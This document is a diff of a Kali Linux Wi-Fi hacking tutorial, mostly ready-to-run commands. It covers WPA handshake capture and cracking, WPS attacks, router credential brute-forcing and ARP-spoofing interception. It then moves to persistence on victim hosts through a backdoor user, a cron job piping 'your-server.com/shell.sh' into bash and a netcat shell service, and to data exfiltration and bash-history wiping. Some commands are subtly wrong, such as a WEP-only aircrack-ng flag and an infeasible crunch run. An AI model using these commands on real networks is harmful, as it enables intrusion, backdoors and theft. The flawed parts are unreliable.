@@ -1,201 +1,404 @@
-# **45‑Minute Kali Linux Wi‑Fi Hacking Lab: From Recon to Exfiltration**
+# Advanced 45-Minute Kali Linux WiFi Hacking Tutorial
 
-## **⚠️ Legal & Ethical Disclaimer**
-> This tutorial is for **educational purposes only**. Conducting wireless penetration testing without explicit written permission from the network owner is illegal in most jurisdictions. Use these techniques only on your own lab networks or in authorized engagements. You are solely responsible for your actions.
-
----
-
-## **Lab Overview**
-- **Duration:** 45 minutes (structured as a guided, hands‑on lab).
-- **Prerequisites:**  
-  * Kali Linux (latest version) installed.  
-  * A wireless adapter that supports **monitor mode** and **packet injection** (e.g., Alfa AWUS036ACH).  
-  * Root privileges (`sudo su`).  
-  * Basic familiarity with the Linux command line.
-- **Objectives:**  
-  1. Perform reconnaissance to discover nearby Wi‑Fi networks.  
-  2. Capture a WPA/WPA2 handshake by forcing a client to reauthenticate.  
-  3. Crack the handshake using dictionary attacks with **aircrack‑ng** and **hashcat**.  
-  4. Generate targeted wordlists with **crunch**.  
-  5. Briefly explore advanced attacks (WPS, evil‑twin) and data‑exfiltration methods.
+## Prerequisites
+- Kali Linux installed (preferably 2024.4 or newer)
+- WiFi adapter supporting monitor mode and packet injection
+- Root privileges (use `sudo su` at beginning)
+- Ethical hacking mindset (only test on YOUR own networks)
 
 ---
 
-## **Part 1: Reconnaissance – Finding Your Target (5 min)**
-### **Step 1.1 – Enable Monitor Mode**
-Monitor mode allows your wireless adapter to capture all packets in the air, not just those addressed to it.
+## Part 1: Wordlist Creation (10 minutes)
 
-1. **Kill interfering processes** that may block monitor mode:
-   ```bash
-   sudo airmon-ng check kill
-   ```
-2. **Start monitor mode** on your wireless interface (commonly `wlan0`):
-   ```bash
-   sudo airmon-ng start wlan0
-   ```
-   * This creates a new interface named `wlan0mon` (or similar). Confirm with `iwconfig`[reference:0].
-
-### **Step 1.2 – Scan for Networks**
-Use `airodump‑ng` to list all nearby access points and their clients.
+### 1.1 Using Crunch for Custom Wordlists
 
 ```bash
-sudo airodump-ng wlan0mon
+# Basic syntax: crunch <min> <max> <charset> -o <output>
+crunch 8 12 abcdefghijklmnopqrstuvwxyz0123456789 -o custom_list.txt
+
+# Using charset.lst with different patterns
+# List available charsets
+crunch 1 1 -f /usr/share/crunch/charset.lst mixalpha-numeric-all-space -o test_charset.txt
+
+# Create WPA password pattern (common: 8-63 chars)
+crunch 8 63 -f /usr/share/crunch/charset.lst mixalpha-numeric-all -o wpa_list.txt
+
+# Pattern-based wordlist (common WiFi patterns: phone numbers, dates)
+crunch 10 10 -t 078%%%%%%% -o phone_list.txt  # UK mobile pattern
+crunch 8 8 -t ddmmyyyy -o date_list.txt
+
+# Generate 10GB of passwords (be careful with disk space)
+crunch 8 8 -f /usr/share/crunch/charset.lst mixalpha-numeric -b 10gb -o /tmp/10gb_list.txt
 ```
 
-* **Output columns:** BSSID (MAC address), PWR (signal strength), CH (channel), ENC (encryption), ESSID (network name)[reference:1].
-* Note the **BSSID**, **channel**, and **ESSID** of your target network (e.g., a test network you own).
-* Press **Ctrl+C** to stop the scan.
+### 1.2 Using Cewl for Targeted Wordlists
+
+```bash
+# Basic website crawling (depth 2)
+cewl -d 2 -m 5 -w company_words.txt https://target-company.com
+
+# With login page spidering
+cewl -d 2 --auth_type basic --auth_user admin --auth_pass password \
+  -w auth_crawl.txt https://target-company.com/admin
+
+# Extract names and emails for password variants
+cewl -d 2 -n -e -w company_emails.txt https://target-company.com/team
+
+# Create password mutations (requires cewl 5.4+)
+cewl -d 1 -m 6 --with-numbers -w base_words.txt https://target-company.com
+# Then use hashcat rules or John to mutate
+```
+
+### 1.3 Combining Wordlists
+
+```bash
+# Merge and sort unique
+cat wordlist1.txt wordlist2.txt | sort -u > combined.txt
+
+# Add common WiFi passwords
+cat /usr/share/wordlists/rockyou.txt combined.txt | sort -u > mega_list.txt
+
+# Filter by length for WPA
+awk 'length($0) >= 8 && length($0) <= 63' mega_list.txt > wpa_filtered.txt
+```
 
 ---
 
-## **Part 2: Capturing the WPA Handshake (10 min)**
-### **Step 2.1 – Focus on the Target**
-Start `airodump‑ng` again, this time locking onto the target’s channel and BSSID, and saving the capture to a file.
+## Part 2: WiFi Reconnaissance & Attack (20 minutes)
+
+### 2.1 Initial Setup and Recon
 
 ```bash
-sudo airodump-ng -c <channel> --bssid <BSSID> -w capture wlan0mon
-```
-* Example: `sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon`
-* The `-w capture` option saves packets to files named `capture-01.cap`, `capture-01.csv`, etc.
+# Check network interfaces
+ip a
+# or
+iwconfig
 
-### **Step 2.2 – Force a Handshake with Deauthentication**
-To capture the 4‑way handshake, you need a client to (re)authenticate. Use `aireplay‑ng` to send deauthentication packets.
+# Identify your WiFi interface (usually wlan0 or wlan1)
+airmon-ng
+
+# Kill interfering processes
+airmon-ng check kill
+
+# Enable monitor mode on wlan0
+airmon-ng start wlan0
+# New interface will be wlan0mon (or similar)
+
+# Scan for networks
+airodump-ng wlan0mon
+
+# Targeted scan
+airodump-ng --bssid TARGET_BSSID --channel 6 -w capture wlan0mon
+```
+
+### 2.2 WPA/WPA2 Handshake Capture
 
 ```bash
-sudo aireplay-ng -0 5 -a <BSSID> -c <client_MAC> wlan0mon
+# Capture handshake (new terminal)
+airodump-ng --bssid TARGET_BSSID --channel 6 --write handshake_capture wlan0mon
+
+# Deauthentication attack to force handshake (in another terminal)
+aireplay-ng --deauth 10 -a TARGET_BSSID -c CLIENT_MAC wlan0mon
+# Or if no specific client:
+aireplay-ng --deauth 10 -a TARGET_BSSID wlan0mon
+
+# Verify handshake capture
+aircrack-ng handshake_capture-01.cap -w /usr/share/wordlists/rockyou.txt
+# Look for "KEY FOUND!" or verify with:
+cap2hccapx handshake_capture-01.cap handshake.hccapx
+hashcat -m 2500 handshake.hccapx /usr/share/wordlists/rockyou.txt
 ```
-* `-0 5` sends five deauthentication bursts.  
-* `-a` is the access‑point BSSID.  
-* `-c` is the MAC address of a connected client (seen in the airodump‑ng “STATIONS” list). If omitted, all clients are deauthenticated[reference:2].
-* After a few seconds, check the airodump‑ng window. If a handshake is captured, you’ll see **“WPA handshake: <BSSID>”** in the top‑right corner[reference:3].
-* Stop airodump‑ng with **Ctrl+C**.
+
+### 2.3 Cracking with Aircrack-ng
+
+```bash
+# Basic dictionary attack
+aircrack-ng -w custom_list.txt -b TARGET_BSSID handshake_capture-01.cap
+
+# Using multiple wordlists
+aircrack-ng -w wordlist1.txt -w wordlist2.txt -b TARGET_BSSID capture.cap
+
+# KoreK attack (slower but thorough)
+aircrack-ng -K -w custom_list.txt capture.cap
+
+# Save progress and resume
+aircrack-ng -w custom_list.txt -b TARGET_BSSID --session my_session capture.cap
+# Resume later with:
+aircrack-ng --session my_session
+```
+
+### 2.4 WPS (WiFi Protected Setup) Attack
+
+```bash
+# Scan for WPS-enabled routers
+wash -i wlan0mon
+
+# Pixie Dust attack (if router vulnerable)
+reaver -i wlan0mon -b TARGET_BSSID -vv -K 1
+
+# Standard WPS pin attack
+reaver -i wlan0mon -b TARGET_BSSID -vv -S -d 2 -l 30
+
+# Using bully (alternative)
+bully -b TARGET_BSSID -v 3 wlan0mon
+
+# One command with optimized settings
+reaver -i wlan0mon -b TARGET_BSSID -c 6 -L -f -N -vv
+```
+
+### 2.5 Joining the Network Once Cracked
+
+```bash
+# Create wpa_supplicant config
+echo 'network={
+    ssid="TARGET_SSID"
+    psk="CRACKED_PASSWORD"
+}' > /tmp/wifi.conf
+
+# Stop monitor mode and return to managed
+airmon-ng stop wlan0mon
+
+# Connect using wpa_supplicant
+wpa_supplicant -B -i wlan0 -c /tmp/wifi.conf -D nl80211
+
+# Get IP address
+dhclient wlan0
+
+# Verify connection
+iwconfig wlan0
+ping -c 4 8.8.8.8
+```
 
 ---
 
-## **Part 3: Cracking the Handshake (10 min)**
-### **Step 3.1 – Dictionary Attack with Aircrack‑ng**
-Use `aircrack‑ng` with a wordlist to crack the handshake.
+## Part 3: Post-Exploitation (10 minutes)
+
+### 3.1 Network Discovery
 
 ```bash
-sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
+# Discover your IP and network range
+ip addr show wlan0
+
+# Scan the network (assuming 192.168.1.0/24)
+nmap -sn 192.168.1.0/24
+# Or more aggressively:
+nmap -sS -sV -O 192.168.1.0/24 -oA network_scan
+
+# Identify the router (usually .1 or .254)
+arp -a
+route -n
+
+# Find router MAC and manufacturer
+arp -n | grep -E '192\.168\.1\.1|192\.168\.1\.254'
+# Lookup MAC vendor:
+curl -s "https://api.macvendors.com/$(arp -n 192.168.1.1 | awk '{print $3}')"
 ```
-* `-w` specifies the wordlist (Kali includes `rockyou.txt` in `/usr/share/wordlists/`).  
-* If the password is in the wordlist, the key will be displayed[reference:4].
 
-### **Step 3.2 – Faster GPU‑Based Cracking with Hashcat**
-If you have a GPU, convert the capture to a hash format that hashcat understands and crack it.
+### 3.2 Router Identification & Default Credentials
 
-1. **Convert the handshake to hashcat format (hash mode 22000):**
-   ```bash
-   hcxpcapngtool -o hash.hc22000 capture-01.cap
-   ```
-2. **Crack with hashcat:**
-   ```bash
-   hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
-   ```
-   * Hashcat supports many attack modes (dictionary, brute‑force, rules). See `hashcat --help` for options[reference:5].
+```bash
+# Fingerprint router
+nmap -sS -sV -p 80,443,22,23 192.168.1.1
+
+# Check for common admin interfaces
+curl -I http://192.168.1.1
+curl -I https://192.168.1.1
+
+# Search for default credentials
+# Method 1: Use router brands database
+searchsploit "router model"
+# Method 2: Online lookup (if internet available)
+# Common formats: admin/admin, admin/password, admin/<blank>
+
+# Automated tools
+medusa -h 192.168.1.1 -U /usr/share/wordlists/common_users.txt -P /usr/share/wordlists/common_passwords.txt -M http -m DIR:/admin
+
+# Check for known vulnerabilities
+nmap --script http-enum,http-vuln* 192.168.1.1
+```
+
+### 3.3 Access Router and Extract Information
+
+```bash
+# Once credentials found, explore
+# View connected devices
+curl -u admin:password http://192.168.1.1/connected_devices.html
+
+# Extract WiFi passwords from router (if possible)
+curl -u admin:password http://192.168.1.1/wireless_settings.html
+
+# Check for port forwarding rules
+curl -u admin:password http://192.168.1.1/port_forwarding.html
+
+# Look for UPnP vulnerabilities
+nmap -sU -p 1900 --script upnp-info 192.168.1.1
+```
+
+### 3.4 Network Traffic Monitoring
+
+```bash
+# ARP spoofing for MITM (requires ip forwarding enabled)
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+# Start arpspoof
+arpspoof -i wlan0 -t 192.168.1.10 192.168.1.1
+arpspoof -i wlan0 -t 192.168.1.1 192.168.1.10
+
+# Capture traffic
+tcpdump -i wlan0 -w captured_traffic.pcap
+
+# Or use bettercap for advanced monitoring
+bettercap -iface wlan0
+# In bettercap: net.probe on; net.recon on; arp.spoof on; net.sniff on
+```
+
+### 3.5 Enable Persistence via SSH
+
+```bash
+# If you find an SSH server on router or device
+
+# Method 1: Add SSH key
+ssh user@192.168.1.10 "mkdir -p ~/.ssh && echo '$(cat ~/.ssh/id_rsa.pub)' >> ~/.ssh/authorized_keys"
+
+# Method 2: Create backdoor user
+ssh root@192.168.1.1 "useradd -m -s /bin/bash backdoor && echo 'backdoor:password123' | chpasswd"
+
+# Method 3: Cron job persistence
+ssh user@192.168.1.10 "echo '*/5 * * * * curl http://your-server.com/shell.sh | bash' | crontab -"
+
+# Method 4: Systemd service persistence (Linux targets)
+ssh root@192.168.1.10 "cat > /etc/systemd/system/persist.service << 'EOF'
+[Unit]
+Description=Persistence Service
+After=network.target
+
+[Service]
+ExecStart=/bin/bash -c 'while true; do nc -lvp 4444 -e /bin/bash; done'
+Restart=always
+
+[Install]
+WantedBy=multi-user.target
+EOF
+systemctl enable persist.service
+systemctl start persist.service"
+```
 
 ---
 
-## **Part 4: Creating Custom Wordlists (5 min)**
-### **Step 4.1 – Generate a Targeted Wordlist with Crunch**
-`crunch` creates wordlists based on character sets and patterns.
+## Part 4: Cleanup and Return to Normal (5 minutes)
+
+### 4.1 Disable Monitor Mode
 
 ```bash
-crunch 8 12 -t @@@%%^^ -o custom_wordlist.txt
-```
-* `8 12` = minimum length 8, maximum length 12.  
-* `-t @@@%%^^` = pattern: three lowercase letters, two digits, two symbols (e.g., `abc12!@`).  
-* `-o` saves the output to a file[reference:6].
+# Stop any monitoring/attacking processes
+airmon-ng check kill
 
-### **Step 4.2 – Use the Custom Wordlist**
-```bash
-sudo aircrack-ng -w custom_wordlist.txt capture-01.cap
+# Stop monitor interface
+airmon-ng stop wlan0mon
+
+# Alternative if having issues
+pkill aireplay
+pkill airodump
+pkill wpa_supplicant
+
+# Manually set interface back to managed
+ip link set wlan0 down
+iwconfig wlan0 mode managed
+ip link set wlan0 up
 ```
-* Or use it with hashcat:
-  ```bash
-  hashcat -m 22000 hash.hc22000 custom_wordlist.txt
-  ```
+
+### 4.2 Restart Network Services
+
+```bash
+# Restart NetworkManager
+systemctl restart NetworkManager
+# or
+service network-manager restart
+
+# Check interface status
+iwconfig wlan0
+# Should show "Mode:Managed"
+
+# Test normal WiFi connection
+nmcli device wifi list
+nmcli device wifi connect "YOUR_NETWORK_SSID" password "YOUR_PASSWORD"
+```
+
+### 4.3 Clean Files and Logs
+
+```bash
+# Remove capture files
+rm -f *.cap *.csv *.netxml *.hccapx
+
+# Clear bash history (optional)
+history -c
+history -w
+
+# Remove temporary files
+rm -f /tmp/wifi.conf /tmp/*.txt
+
+# Check for any leftover processes
+ps aux | grep -E '(air|reaver|bully)'
+kill -9 [PID]  # if any found
+```
+
+### 4.4 Final Verification
+
+```bash
+# Verify normal operation
+systemctl status NetworkManager
+
+# Test internet connectivity
+ping -c 4 google.com
+
+# Check all interfaces are in normal mode
+iwconfig
+
+# Verify no monitor interfaces
+ip link show | grep mon
+# Should return nothing
+```
 
 ---
 
-## **Part 5: Advanced Techniques (5 min)**
-### **5.1 – WPS Pin Attack**
-If the target router has WPS enabled, you can try to recover the PIN (and thus the PSK) with `bully` or `reaver`.
+## Quick Reference Cheat Sheet
 
 ```bash
-sudo bully -b <BSSID> -c <channel> wlan0mon
+# Monitor mode quickstart
+airmon-ng check kill
+airmon-ng start wlan0
+airodump-ng wlan0mon
+
+# Handshake capture
+airodump-ng --bssid BSSID -c CH -w capture wlan0mon
+aireplay-ng --deauth 10 -a BSSID wlan0mon
+
+# Cracking
+aircrack-ng -w wordlist.txt capture-01.cap
+
+# WPS attack
+wash -i wlan0mon
+reaver -i wlan0mon -b BSSID -vv
+
+# Cleanup
+airmon-ng stop wlan0mon
+systemctl restart NetworkManager
 ```
-* This attack exploits weak WPS implementations. It may take several hours.
-
-### **5.2 – Evil‑Twin (Rogue AP)**
-Set up a fake access point with the same SSID as the target, then capture credentials when clients connect.
-
-1. **Create the fake AP:**
-   ```bash
-   sudo airbase-ng -a <BSSID> --essid "Target_SSID" -c <channel> wlan0mon
-   ```
-2. **Configure DHCP and routing** (e.g., with `dnsmasq` and `iptables`).
-3. **Capture login pages** with tools like `sslstrip` or `bettercap`.
-
-> **Note:** Evil‑twin attacks require additional setup and are beyond the scope of this 45‑minute lab. They are mentioned here as a logical next step.
 
 ---
 
-## **Part 6: Data Exfiltration (5 min)**
-Once you have the PSK, you can associate with the network and attempt to exfiltrate data.
+## Important Notes
 
-### **Step 6.1 – Connect to the Network**
-Use `wpa_supplicant` or a graphical manager to connect with the cracked password.
+1. **Legal Compliance**: Only test networks you own or have written permission to test
+2. **Adapter Compatibility**: Not all WiFi adapters support monitor mode and packet injection
+3. **Wordlist Quality**: Success heavily depends on wordlist quality and relevance
+4. **WPS Limitations**: Many modern routers have WPS disabled or lockout mechanisms
+5. **Detection Risk**: These attacks are detectable by modern security systems
 
-```bash
-sudo wpa_supplicant -i wlan0 -c <(wpa_passphrase "SSID" "password") &
-sudo dhclient wlan0
-```
+## Time Management
+- 0-10min: Wordlist creation
+- 10-30min: WiFi attacks and cracking
+- 30-40min: Post-exploitation
+- 40-45min: Cleanup and verification
 
-### **Step 6.2 – Exfiltrate Data**
-Assume you have found sensitive files on the internal network. Simple exfiltration methods include:
-
-* **HTTP POST** with `curl`:
-  ```bash
-  curl -F "file=@/path/to/local/file" http://your-server.com/upload
-  ```
-* **DNS tunneling** (slow but stealthy):
-  ```bash
-  # On your server, run a DNS server (e.g., dnschef).
-  # On the target, use dns2tcp or iodine to tunnel data.
-  ```
-* **SSH/SCP** (if outbound SSH is allowed):
-  ```bash
-  scp /path/to/file user@your-server.com:~/exfil/
-  ```
-
-> **Reminder:** Exfiltration is only legal on networks you own or have explicit permission to test.
-
----
-
-## **Part 7: Cleanup & Conclusion (5 min)**
-### **Step 7.1 – Restore Your Interface**
-Stop monitor mode and restart the network manager.
-
-```bash
-sudo airmon-ng stop wlan0mon
-sudo systemctl start network-manager
-```
-
-### **Step 7.2 – Key Takeaways**
-* **Recon:** Monitor mode (`airmon‑ng`) and scanning (`airodump‑ng`) are the foundation of wireless assessment.
-* **Handshake Capture:** Deauthentication (`aireplay‑ng`) forces clients to reauthenticate, allowing you to capture the WPA handshake.
-* **Cracking:** Dictionary attacks (`aircrack‑ng`, `hashcat`) are effective against weak passwords. Custom wordlists (`crunch`) increase success.
-* **Advanced Attacks:** WPS pin attacks and evil‑twin setups are common intermediate/advanced techniques.
-* **Exfiltration:** Once on a network, data can be extracted via HTTP, DNS, or SSH.
-
-### **Step 7.3 – Further Learning**
-* **Practice:** Set up your own lab with an old router and test devices.
-* **Resources:**  
-  * [Aircrack‑ng official documentation](https://www.aircrack-ng.org/)  
-  * [Hashcat wiki](https://hashcat.net/wiki/)  
-  * [Wi‑Fi Security & Penetration Testing – Advanced courses](https://www.offensive-security.com/)
-
----
-
+This tutorial provides a comprehensive overview. Practice each technique in a controlled lab environment before attempting in real scenarios.
